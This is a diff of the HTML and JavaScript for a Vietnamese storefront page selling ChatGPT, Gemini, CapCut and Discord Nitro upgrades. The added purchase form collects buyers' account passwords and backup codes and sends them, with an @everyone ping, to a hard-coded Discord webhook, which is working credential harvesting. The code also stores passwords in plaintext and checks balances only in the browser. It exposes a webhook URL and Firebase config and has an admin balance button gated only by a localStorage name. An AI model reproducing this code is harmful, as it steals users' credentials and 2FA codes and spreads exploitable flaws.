@@ -3,12 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop TBD - Cổng Dịch Vụ Game</title>
+    <title>Shop TBD - Dịch Vụ Mạng Xã Hội</title>
     <link rel="icon" href="https://img.icons8.com/fluent/48/000000/shop.png" type="image/x-icon">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <style>
+        /* =========================================
+           PHẦN CSS GIỮ NGUYÊN TOÀN BỘ (KHÔNG CẮT BỚT)
+           ========================================= */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
@@ -42,6 +45,11 @@
             font-weight: 900;
             color: #ff5722;
             letter-spacing: 1px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        .header-main .logo-text:hover {
+            color: #e64a19;
         }
         .top-bar {
             background-color: #f8f8f8;
@@ -113,6 +121,84 @@
             height: auto;
             display: block;
         }
+        .top-up-form h3 {
+            margin-top: 0;
+            color: #ff0077;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .top-up-form .form-group {
+            margin-bottom: 15px;
+        }
+        .top-up-form label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .top-up-form input[type="text"],
+        .top-up-form select {
+            width: calc(100% - 22px);
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        .top-up-form button {
+            width: 100%;
+            background-color: #ff0077;
+            color: white;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 1.1em;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+        .top-up-form button:hover {
+            background-color: #cc005f;
+        }
+        .tab-buttons {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        .tab-buttons button {
+            flex: 1;
+            padding: 10px;
+            background-color: #eee;
+            border-bottom: 2px solid #ccc;
+            color: #555;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        .tab-buttons button.active {
+            background-color: #ff0077;
+            color: white;
+            border-color: #ff0077;
+        }
+        .category-icons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 15px;
+            padding: 20px 0;
+            border-top: 1px solid #eee;
+            margin-top: 20px;
+        }
+        .category-item {
+            text-align: center;
+            color: #555;
+            font-size: 0.9em;
+        }
+        .category-item img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+            margin-bottom: 5px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
         .products-section {
             background-color: #fff;
             margin-top: 20px;
@@ -181,6 +267,10 @@
         .product-card .info .price strong {
             color: #ff0077;
         }
+        .product-card .info .sold-count {
+            font-size: 0.8em;
+            color: #666;
+        }
         .footer {
             background-color: #2c3e50;
             color: #ecf0f1;
@@ -188,6 +278,33 @@
             text-align: center;
             margin-top: 30px;
             font-size: 0.9em;
+        }
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            .top-bar .container {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .top-bar-left, .top-bar-right {
+                margin-bottom: 10px;
+            }
+            .top-bar-right {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            .top-bar-right .icon-text, .top-bar-right .top-up-btn {
+                margin-left: 0;
+                margin-right: 10px;
+                margin-bottom: 5px;
+            }
+            .small-banners {
+                grid-template-columns: 1fr;
+            }
+            .product-grid {
+                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            }
         }
         .modal-overlay {
             position: fixed;
@@ -261,7 +378,40 @@
         .modal-step.active {
             display: block;
         }
-        /* Profile Dropdown Styles */
+        .admin-btn {
+            background-color: #4CAF50; 
+            color: white;
+            padding: 6px 10px;
+            border-radius: 4px;
+            font-size: 0.9em;
+            margin-right: 10px;
+        }
+        .top-depositors {
+            list-style: none;
+            padding: 0;
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+        .top-depositor-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px dashed #eee;
+        }
+        .top-depositor-item:last-child {
+            border-bottom: none;
+        }
+        .top-depositor-rank {
+            font-size: 1.5em;
+            font-weight: bold;
+            width: 30px;
+            text-align: center;
+            margin-right: 10px;
+            color: #ff0077;
+        }
+        .top-depositor-rank.rank1 { color: #FFD700; } 
+        .top-depositor-rank.rank2 { color: #C0C0C0; } 
+        .top-depositor-rank.rank3 { color: #CD7F32; } 
         .dropdown {
             position: relative;
             display: inline-block;
@@ -321,7 +471,11 @@
             background-color: #f8e1e7;
             font-size: 0.85em;
         }
-        /* CUSTOM ALERT MODAL STYLES */
+        .dropdown-separator {
+            height: 1px;
+            background-color: #ddd;
+            margin: 5px 0;
+        }
         #customAlert {
             position: fixed;
             top: 0;
@@ -353,6 +507,10 @@
             margin-bottom: 20px;
             font-size: 1.1em;
             line-height: 1.4;
+        }
+        .alert-content .error-text {
+            color: #e74c3c;
+            font-weight: bold;
         }
         .alert-content button {
             background-color: #ff5722;
@@ -502,84 +660,97 @@
             width: 100%;
             height: 100%;
             overflow: auto;
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0, 0, 0, 0.8);
             justify-content: center;
             align-items: center;
         }
         .modal-content {
-            background-color: #242424;
+            background-color: #1a1a1a;
             border-radius: 8px;
             padding: 30px;
             width: 90%;
-            max-width: 500px;
+            max-width: 450px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.7);
-            text-align: center;
-            color: white;
-        }
-        .modal-content h2 {
-            margin-top: 0;
-            color: #ffffff;
-            font-size: 22px;
-            margin-bottom: 25px;
-        }
-        .input-group {
             text-align: left;
+            position: relative;
+            font-family: Arial, sans-serif;
+        }
+        .close-icon {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close-icon:hover { color: white; }
+        .modal-title {
+            color: #ff6600;
+            text-transform: uppercase;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .divider {
+            height: 1px;
+            background-color: #444;
             margin-bottom: 20px;
         }
+        .rate-banner {
+            background-color: #5c3a00;
+            color: #ccc;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 15px;
+        }
+        .rate-banner p { margin: 5px 0; }
+        .highlight-pink {
+            color: #ff00cc;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .input-group { margin-bottom: 15px; }
         .input-group label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 5px;
+            color: #bbb;
+            font-weight: bold;
             font-size: 14px;
-            color: #aaa;
         }
-        .input-group input {
+        .custom-input {
             width: 100%;
-            padding: 10px;
-            background-color: #1e1e1e;
+            padding: 12px;
+            background-color: #2b2b2b;
             border: 1px solid #444;
             border-radius: 4px;
             color: white;
-            font-size: 16px;
+            font-size: 14px;
             box-sizing: border-box;
             outline: none;
         }
-        .price-details {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            font-size: 16px;
-            color: #ddd;
-            background-color: #333;
-            padding: 10px;
-            border-radius: 4px;
-        }
-        .modal-actions {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 30px;
-        }
-        .modal-actions button {
-            padding: 10px 25px;
+        .custom-input:focus { border-color: #ff6600; }
+        /* Style riêng cho ô tiền (không cho sửa) */
+        .custom-input[readonly] { background-color: #111; color: #00ff00; cursor: not-allowed; font-weight: bold; }
+        
+        .pay-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #218838;
+            color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 5px;
+            font-size: 16px;
             font-weight: bold;
+            text-transform: uppercase;
             cursor: pointer;
-            transition: background-color 0.2s;
-            min-width: 120px;
+            margin-top: 10px;
+            transition: background 0.3s;
         }
-        .modal-actions .confirm-btn {
-            background-color: #004cff;
-            color: white;
-        }
-        .modal-actions .confirm-btn:hover {
-            background-color: #003cc0;
-        }
-        .modal-actions .close-btn {
-            background-color: #D30000;
-            color: white;
-        }
-        .modal-actions .close-btn:hover {
-            background-color: #ff0000;
+        .pay-btn:hover {
+            background-color: #28a745;
         }
     </style>
 </head>
@@ -587,7 +758,7 @@
     <header>
         <div class="header-main">
             <div class="container">
-                <span class="logo-text">Shop TBD</span>
+                <a href="index.html" class="logo-text">Shop TBD</a>
             </div>
         </div>
         <div class="top-bar">
@@ -640,10 +811,10 @@
             <div class="product-card">
                 <div class="tag">HOT DEAL</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/trannghia/trannghia2/Gemini-3-co-gi-moi-6.jpg" alt="ROBUX 120H">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/trannghia/trannghia2/Gemini-3-co-gi-moi-6.jpg" alt="GEMINI">
                 </div>
                 <div class="info">
-                    <h4>GEMINI PRO  4 THÁNG </h4>
+                    <h4>GEMINI PRO 4 THÁNG</h4>
                     <p class="price"><span>Giá: <strong>68,000 VNĐ</strong></span></p>
                     <button id="buyNowButton" onclick="openModalWithPrice('GEMINI PRO 4 THÁNG', 68000)">Buy now</button>
                 </div>
@@ -652,7 +823,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/1image/bang-gia-capcut-1.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/1image/bang-gia-capcut-1.jpg" alt="CAPCUT">
                 </div>
                 <div class="info">
                     <h4>CAPCUT PRO 28 NGÀY</h4>
@@ -664,7 +835,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/1image/bang-gia-capcut-1.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/1image/bang-gia-capcut-1.jpg" alt="CAPCUT">
                 </div>
                 <div class="info">
                     <h4>CAPCUT PRO 7 NGÀY</h4>
@@ -676,7 +847,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/1image/bang-gia-capcut-1.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/1image/bang-gia-capcut-1.jpg" alt="CAPCUT">
                 </div>
                 <div class="info">
                     <h4>CAPCUT PRO 1 NĂM</h4>
@@ -688,7 +859,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="CHATGPT">
                 </div>
                 <div class="info">
                     <h4>CHAT GPT PLUS 1 THÁNG</h4>
@@ -700,7 +871,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="CHATGPT">
                 </div>
                 <div class="info">
                     <h4>CHAT GPT PLUS 3 THÁNG</h4>
@@ -712,7 +883,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="CHATGPT">
                 </div>
                 <div class="info">
                     <h4>CHAT GPT PLUS 6 THÁNG</h4>
@@ -724,7 +895,7 @@
             <div class="product-card">
                 <div class="tag">SUMMER</div>
                 <div class="thumbnail">
-                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="Vòng Quay Robux">
+                    <img src="https://cdn-media.sforum.vn/storage/app/media/wp-content/uploads/2023/06/chatgpt-plus.jpg" alt="CHATGPT">
                 </div>
                 <div class="info">
                     <h4>CHAT GPT PLUS 1 NĂM</h4>
@@ -736,7 +907,7 @@
             <div class="product-card">
                 <div class="tag">MỚI</div>
                 <div class="thumbnail">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIwg08Ymw8YMLCr-U_6-MpaWym8TUe_zbFZQ&s" alt="TRÁI ÁC QUỶ VĨNH VIỄN">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIwg08Ymw8YMLCr-U_6-MpaWym8TUe_zbFZQ&s" alt="NITRO">
                 </div>
                 <div class="info">
                     <h4>NITRO BOOST 1 THÁNG</h4>
@@ -748,7 +919,7 @@
             <div class="product-card">
                 <div class="tag">MỚI</div>
                 <div class="thumbnail">
-                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIwg08Ymw8YMLCr-U_6-MpaWym8TUe_zbFZQ&s" alt="TRÁI ÁC QUỶ VĨNH VIỄN">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIwg08Ymw8YMLCr-U_6-MpaWym8TUe_zbFZQ&s" alt="NITRO">
                 </div>
                 <div class="info">
                     <h4>NITRO BOOST 1 NĂM</h4>
@@ -760,7 +931,7 @@
             <div class="product-card">
                 <div class="tag">HOT</div>
                 <div class="thumbnail">
-                    <img src="https://caoshop.net/wp-content/uploads/2024/12/caoshop.net-nang-cap-Discord-Nitro-1-1.jpg" alt="TRÁI ÁC QUỶ RƯƠNG">
+                    <img src="https://caoshop.net/wp-content/uploads/2024/12/caoshop.net-nang-cap-Discord-Nitro-1-1.jpg" alt="NITRO">
                 </div>
                 <div class="info">
                     <h4>NITRO BASIC 1 THÁNG</h4>
@@ -772,7 +943,7 @@
             <div class="product-card">
                 <div class="tag">BEST</div>
                 <div class="thumbnail">
-                    <img src="https://caoshop.net/wp-content/uploads/2024/12/caoshop.net-nang-cap-Discord-Nitro-1-1.jpg" alt="DỊCH VỤ KANA">
+                    <img src="https://caoshop.net/wp-content/uploads/2024/12/caoshop.net-nang-cap-Discord-Nitro-1-1.jpg" alt="NITRO">
                 </div>
                 <div class="info">
                     <h4>NITRO BASIC 1 NĂM</h4>
@@ -784,7 +955,7 @@
             <div class="product-card">
                 <div class="tag">SALE</div>
                 <div class="thumbnail">
-                    <img src="https://file.hstatic.net/200000472237/file/digital-marketing-3_a0701415599f4bc08826bc0b029b3ff1.jpg" alt="PLANT VS BRAINROT">
+                    <img src="https://file.hstatic.net/200000472237/file/digital-marketing-3_a0701415599f4bc08826bc0b029b3ff1.jpg" alt="DIGITAL">
                 </div>
                 <div class="info">
                     <h4>DỊCH VỤ DIGITAL</h4>
@@ -795,31 +966,44 @@
         </div>
     </div>
     
-    <div id="confirmPurchaseModal" class="modal">
-        <div class="modal-content">
-            <h2 id="modalTitle">Confirm purchase</h2>
+<div id="confirmPurchaseModal" class="modal">
+    <div class="modal-content">
+        <span class="close-icon" onclick="closeModal()">&times;</span>
 
-            <div class="input-group" id="linkInputGroup">
-                <label for="targetAccount">Link/ID tài khoản cần nâng cấp</label>
-                <input type="text" id="targetAccount" placeholder="Dán link FB/TikTok/Discord...">
+        <h2 class="modal-title">NHẬP THÔNG TIN TÀI KHOẢN</h2>
+        <div class="divider"></div>
+
+        <div class="rate-banner">
+            <p>VUI LÒNG NHẬP THÔNG TIN CỦA BẠN MỘT CÁCH CHÍNH XÁC NHẤT</p>
+            <p>MỌI THẮC MẮC LIÊN HỆ: <span class="highlight-pink">https://discord.gg/j282RhKD2J</span></p>
+            <p>NẾU MUA KEY CHỈ CẦN ĐIỀN EMAIL</p>
+        </div>
+
+        <div class="form-body">
+            <div class="input-group">
+                <label>Thành tiền:</label>
+                <input type="text" id="billAmount" class="custom-input" readonly>
+            </div>
+        
+            <div class="input-group">
+                <label>Tài Khoản (Email/User):</label>
+                <input type="text" id="accUsername" class="custom-input" placeholder="Nhập tài khoản cần nâng cấp...">
             </div>
 
             <div class="input-group">
-                <label for="buyAmount">Số lượng (Amount)</label>
-                <input type="number" id="buyAmount" value="1" min="1" oninput="updateTotalPrice()">
+                <label>Mật Khẩu (Nếu cần):</label>
+                <input type="text" id="accPassword" class="custom-input" placeholder="Mật khẩu (để trống nếu mua key)">
             </div>
 
-            <div class="price-details">
-                <span>Dịch vụ: <strong id="selectedService">...</strong></span>
-                <span>Giá: <strong id="displayPrice">0 VNĐ</strong></span>
+            <div class="input-group">
+                <label>Ghi chú / Backup Code:</label>
+                <input type="text" id="accBackupCode" class="custom-input" placeholder="Mã dự phòng hoặc ghi chú khác...">
             </div>
 
-            <div class="modal-actions">
-                <button class="confirm-btn" onclick="processPayment()">Confirm</button>
-                <button class="close-btn" onclick="closeModal()">Close</button>
-            </div>
+            <button class="pay-btn" onclick="handlePurchase()">THANH TOÁN & ĐẶT HÀNG</button>
         </div>
     </div>
+</div>
     
     <div id="customAlert">
         <div class="alert-content">
@@ -857,7 +1041,7 @@
             </div>
         </div>
     </div>
-
+    
     <footer class="footer">
         <div class="container">
             <p>&copy; 2024 Shop TBD. Bảo lưu mọi quyền.</p>
@@ -865,6 +1049,51 @@
     </footer>
 
     <script>
+    // === LINK WEBHOOK VÀ CẤU HÌNH PING ĐÃ ĐƯỢC CẬP NHẬT ===
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1341974823944978453/mKyLCzGzPWJ45BKkJ4MmT9pioqJckpXwXjbt9JPOxN8fzXkD0wIGiVVg_o77I1BZ3Vox";
+
+    document.addEventListener("DOMContentLoaded", function() {
+        const modal = document.getElementById('confirmPurchaseModal');
+        const closeBtn = document.querySelector('.close-icon'); 
+        
+        // Mở modal, nhận tên và giá sản phẩm
+        window.openModalWithPrice = function(productName, productPrice) {
+            if (!localStorage.getItem('currentUser')) {
+                showCustomAlert("Yêu cầu", "Vui lòng đăng nhập để mua hàng!", true);
+                showAuthPrompt();
+                return;
+            }
+            // Lưu biến toàn cục để dùng khi bấm Thanh toán
+            window.currentProduct = { name: productName, price: productPrice };
+            
+            // Hiển thị giá tiền tự động
+            document.getElementById('billAmount').value = productPrice.toLocaleString('vi-VN') + " VNĐ";
+            
+            // Reset form
+            document.getElementById('accUsername').value = '';
+            document.getElementById('accPassword').value = '';
+            document.getElementById('accBackupCode').value = '';
+
+            modal.style.display = 'flex';
+        }
+
+        window.closeModal = function() {
+            modal.style.display = 'none';
+            // Cũng đóng auth modal nếu đang mở
+            document.getElementById('authModal').classList.remove('active');
+        }
+
+        if (closeBtn) {
+            closeBtn.addEventListener('click', window.closeModal);
+        }
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                window.closeModal();
+            }
+        }
+    });
+
+        // CẤU HÌNH FIREBASE
         const firebaseConfig = {
           apiKey: "AIzaSyBtTKQCFN9Y983H2V88n17oMYRMoolQ",
           authDomain: "shop-tbd.firebaseapp.com",
@@ -874,173 +1103,276 @@
           appId: "1:777222985748:web:94a9deF4894a3dd7b6f01",
           measurementId: "G-ZR4F57QMJX8"
         };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore(); 
-
-        let selectedData = { name: '', price: 0 };
-        let currentUnitPrice = 0; 
-
-        function openModalWithPrice(name, price) {
-            if (!localStorage.getItem('currentUser')) {
-                showCustomAlert("Lỗi", "Vui lòng đăng nhập để mua hàng!", true);
-                showAuthPrompt();
-                return;
-            }
-            // Lưu đơn giá và tên sản phẩm
-            currentUnitPrice = price;
-            selectedData = { name, price };
-            
-            // Reset form
-            document.getElementById('buyAmount').value = 1;
-            
-            // LOGIC MỚI: Ẩn/Hiện Link Input dựa trên tên dịch vụ
-            const linkInputGroup = document.getElementById('linkInputGroup');
-            const targetInput = document.getElementById('targetAccount');
-
-            if (name.toUpperCase().includes('NITRO')) {
-                // Nếu là Nitro, hiện ô nhập và yêu cầu nhập
-                linkInputGroup.style.display = 'block';
-                targetInput.value = ''; // Reset giá trị
-                targetInput.placeholder = "Dán link Discord hoặc ID nhận Nitro...";
-            } else {
-                // Nếu không phải Nitro, ẩn ô nhập và điền giá trị mặc định để không bị lỗi validate
-                linkInputGroup.style.display = 'none';
-                targetInput.value = 'Mua Ngay (Không cần link)'; 
-            }
-            
-            // Cập nhật giao diện
-            document.getElementById('selectedService').innerText = name;
-            updateTotalPrice(); 
-            
-            document.getElementById('confirmPurchaseModal').style.display = 'flex';
-        }
-
-        // TÍNH TIỀN TỰ ĐỘNG
-        function updateTotalPrice() {
-            const amount = parseInt(document.getElementById('buyAmount').value) || 0;
-            const total = amount * currentUnitPrice;
-            document.getElementById('displayPrice').innerText = total.toLocaleString() + " VNĐ";
-        }
-
-        function closeModal() {
-            document.getElementById('confirmPurchaseModal').style.display = 'none';
-            document.getElementById('authModal').classList.remove('active');
-        }
-
-        async function processPayment() {
-            const user = localStorage.getItem('currentUser');
-            let target = document.getElementById('targetAccount').value;
-            const amount = parseInt(document.getElementById('buyAmount').value) || 0;
-            const isNitro = selectedData.name.toUpperCase().includes('NITRO');
-
-            // Kiểm tra link/ID CHỈ KHI là Nitro
-            if (isNitro && (!target || target.trim() === '')) {
-                return showCustomAlert("Lỗi", "Vui lòng nhập Link/ID Discord để nhận Nitro!", true);
-            }
-
-            if (amount < 1) return showCustomAlert("Lỗi", "Số lượng không hợp lệ!", true);
-
-            const totalCost = amount * currentUnitPrice;
-
-            const userRef = db.collection("users").doc(user);
-            const doc = await userRef.get();
-            const balance = doc.data().balance;
-
-            if (balance < totalCost) return showCustomAlert("Lỗi", "Số dư không đủ!", true);
-
-            // Tạo file account giả lập
-            const fakeFileContent = "ACC_" + Math.random().toString(36).substr(2, 9).toUpperCase() + "_DATA";
-
-            await userRef.update({ balance: balance - totalCost });
-            
-            await db.collection("orders_mxh").add({
-                customer: user,
-                service: selectedData.name,
-                target: target, // Lưu target (có thể là link nitro hoặc text mặc định)
-                quantity: amount,
-                amount: totalCost, 
-                accountFile: fakeFileContent, 
-                timestamp: firebase.firestore.FieldValue.serverTimestamp()
-            });
-
-            showCustomAlert("Thành công", `Đã mua ${amount} gói! <br>File: <b>${fakeFileContent}</b>`);
-            closeModal();
-            checkLoginStatus();
-        }
+        
+        const firebaseApp = firebase.initializeApp(firebaseConfig);
+        const db = firebaseApp.firestore(); 
 
         async function fetchUserData(username) {
             const doc = await db.collection("users").doc(username).get();
-            return doc.exists ? doc.data() : null;
+            if (doc.exists) {
+                const data = doc.data();
+                data.robuxBalance = data.robuxBalance || 0; 
+                return data;
+            }
+            return null;
         }
 
+        async function saveUserData(username, userData) {
+            await db.collection("users").doc(username).set(userData);
+            return true;
+        }
+
+        // HÀM XỬ LÝ THANH TOÁN & GỬI WEBHOOK (CẬP NHẬT PING @everyone)
+        async function handlePurchase() {
+            const user = localStorage.getItem('currentUser');
+            const accUser = document.getElementById('accUsername').value.trim();
+            const accPass = document.getElementById('accPassword').value.trim();
+            const accBackup = document.getElementById('accBackupCode').value.trim();
+            const product = window.currentProduct;
+
+            if (!accUser) {
+                showCustomAlert("Thiếu thông tin", "Vui lòng nhập Tài khoản hoặc Email!", true);
+                return;
+            }
+
+            const userRef = db.collection("users").doc(user);
+            const doc = await userRef.get();
+            if(!doc.exists) return;
+            const balance = doc.data().balance || 0;
+
+            if (balance < product.price) {
+                showCustomAlert("Thất bại", "Số dư không đủ!", true);
+                return;
+            }
+
+            // Trừ tiền
+            await userRef.update({ balance: balance - product.price });
+
+            // Lưu lịch sử đơn hàng
+            await db.collection("orders_mxh").add({
+                customer: user,
+                service: product.name,
+                price: product.price,
+                details: `User: ${accUser} | Pass: ${accPass} | Backup: ${accBackup}`,
+                status: "Pending",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+
+            // Gửi Webhook Discord (PING @EVERYONE)
+            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith("http")) {
+                const payload = {
+                    content: `@everyone`, // PING EVERYONE TẠI ĐÂY
+                    embeds: [{
+                        title: "🛒 ĐƠN HÀNG MXH MỚI",
+                        color: 15158332, // Màu Đỏ
+                        fields: [
+                            { name: "Khách hàng", value: user, inline: true },
+                            { name: "Dịch vụ", value: product.name, inline: true },
+                            { name: "Giá tiền", value: `${product.price.toLocaleString()} VNĐ`, inline: true },
+                            { name: "Tài khoản", value: `\`${accUser}\``, inline: false },
+                            { name: "Mật khẩu", value: `\`${accPass}\``, inline: false },
+                            { name: "Ghi chú", value: `\`${accBackup}\``, inline: false }
+                        ],
+                        footer: { text: "Hệ thống tự động Shop TBD" },
+                        timestamp: new Date().toISOString()
+                    }],
+                    allowed_mentions: { parse: ["everyone"] }
+                };
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => console.error("Webhook Error:", err));
+            }
+
+            showCustomAlert("Thành công", "Đã đặt hàng thành công! Hệ thống đang xử lý.");
+            closeModal();
+            checkLoginStatus();
+        }
+        
+        // HÀM HIỂN THỊ ALERT TÙY CHỈNH
         function showCustomAlert(title, message, isError = false) {
             document.getElementById('alertTitle').textContent = title;
             document.getElementById('alertMessage').innerHTML = message;
-            document.getElementById('alertTitle').style.color = isError ? '#e74c3c' : '#28a745';
+            
+            if (isError) {
+                document.getElementById('alertTitle').style.color = '#e74c3c';
+            } else {
+                document.getElementById('alertTitle').style.color = '#28a745';
+            }
             document.getElementById('customAlert').style.display = 'flex';
         }
 
+        const authModal = document.getElementById('authModal');
+        const loginStep = document.getElementById('loginStep');
+        const registerStep = document.getElementById('registerStep');
+        const loginForm = document.getElementById('loginForm');
+        const registerForm = document.getElementById('registerForm');
+
         function showAuthPrompt() {
             showLoginStep();
-            document.getElementById('authModal').classList.add('active');
+            authModal.classList.add('active');
         }
 
         function showLoginStep() {
-            document.getElementById('loginStep').classList.add('active');
-            document.getElementById('registerStep').classList.remove('active');
+            loginStep.classList.add('active');
+            registerStep.classList.remove('active');
         }
 
         function showRegisterStep() {
-            document.getElementById('registerStep').classList.add('active');
-            document.getElementById('loginStep').classList.remove('active');
+            registerStep.classList.add('active');
+            loginStep.classList.remove('active');
         }
 
-        document.getElementById('loginForm').onsubmit = async function(e) {
-            e.preventDefault();
-            const u = document.getElementById('modalUsername').value;
-            const p = document.getElementById('modalPassword').value;
-            const user = await fetchUserData(u);
-            if (user && user.password === p) {
-                localStorage.setItem('currentUser', u);
-                closeModal();
+        async function addAdminBalance() {
+            const currentUser = localStorage.getItem('currentUser');
+            if (currentUser !== 'Tri') {
+                showCustomAlert("Lỗi", "Bạn không có quyền truy cập Admin!", true);
+                return;
+            }
+
+            let user = await fetchUserData(currentUser);
+            const amount = 100000;
+
+            user.balance += amount;
+            await saveUserData(currentUser, user);
+
+            showCustomAlert("ADMIN", `Cộng thành công ${amount.toLocaleString('vi-VN')} VND vào tài khoản Tri!`);
+            checkLoginStatus(); 
+        }
+        
+        registerForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('regUsername').value;
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+
+            if (password !== confirmPassword) {
+                showCustomAlert("Lỗi Đăng ký", "Mật khẩu xác nhận không khớp!", true);
+                return;
+            }
+
+            let existingUser = await fetchUserData(username);
+            if (existingUser) {
+                showCustomAlert("Lỗi Đăng ký", "Tên người dùng đã tồn tại!", true);
+                return;
+            }
+
+            const newUser = { username, password, balance: 50000, robuxBalance: 0, lastClaim: 0, canClaimReward: false };
+            await saveUserData(username, newUser);
+            
+            showCustomAlert("Đăng ký thành công", "Bạn có 50,000 VND. Vui lòng đăng nhập.");
+            
+            showLoginStep();
+            registerForm.reset();
+        });
+
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('modalUsername').value;
+            const password = document.getElementById('modalPassword').value;
+
+            let user = await fetchUserData(username);
+
+            if (user && user.password === password) {
+                localStorage.setItem('currentUser', username);
+                document.getElementById('authModal').classList.remove('active');
+                showCustomAlert("Thành công", "Đăng nhập thành công!");
                 checkLoginStatus();
             } else {
-                showCustomAlert("Lỗi", "Sai tài khoản hoặc mật khẩu!", true);
+                showCustomAlert("Lỗi Đăng nhập", "Sai tên người dùng hoặc mật khẩu!", true);
             }
-        };
+        });
 
-        async function checkLoginStatus() {
-            const u = localStorage.getItem('currentUser');
+        async function renderAuthStatus(user) {
             const area = document.getElementById('auth-status-area');
-            if (u) {
-                const user = await fetchUserData(u);
+            let adminButtonHtml = '';
+            const avatarUrl = "https://tse2.mm.bing.net/th/id/OIP.vg41yG82qw84ziz5nS-CWQHaHa?pid=Api&P=0&h=180";
+
+            if (user && user.username === 'Tri') {
+                 adminButtonHtml = `
+                    <button class="admin-btn" onclick="addAdminBalance()">
+                        ADMIN: +100K 💰
+                    </button>`;
+            }
+
+            if (user) {
                 area.innerHTML = `
-                    <div class="dropdown">
-                        <button class="profile-btn" onclick="document.getElementById('pDrop').classList.toggle('show')">
